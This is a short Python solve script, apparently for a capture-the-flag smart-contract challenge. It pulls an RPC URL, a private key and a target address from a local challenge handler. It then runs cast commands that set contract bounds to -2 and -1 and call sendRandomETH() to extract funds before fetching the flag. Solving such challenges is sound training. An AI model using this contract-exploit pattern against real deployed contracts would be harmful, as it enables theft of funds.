#!/usr/bin/env python3

from os import system
from pwn import remote

HANDLER_PORT = 8002

if __name__ == "__main__":
    challHandler = ("0.0.0.0", HANDLER_PORT)

    with remote("0.0.0.0", HANDLER_PORT) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"1")
        p.recvuntil(b"Here's your connection info:\n\n")
        connection_info = {}
        data = p.recvall()
    
    lines = data.decode().split('\n')
    for line in lines:
        if line:
            print(line)
            key, value = line.strip().split(': ')
            connection_info[key] = value

    rpc_url = connection_info['RPC URL']
    pvk = connection_info['Player Private Key']
    target = connection_info['Target Contract']

    system(
        f"cast send --rpc-url {rpc_url} --private-key {pvk} {target} 'setBounds(int64,int64)' -- -2 -1"
    )
    system(
        f"cast send {target} 'sendRandomETH()' --rpc-url {rpc_url} --private-key {pvk}"
    )

    # get flag
    with remote("0.0.0.0", HANDLER_PORT) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"3")
        flag = p.recvall().decode()
        
    print(f"\n\n[*] {flag}")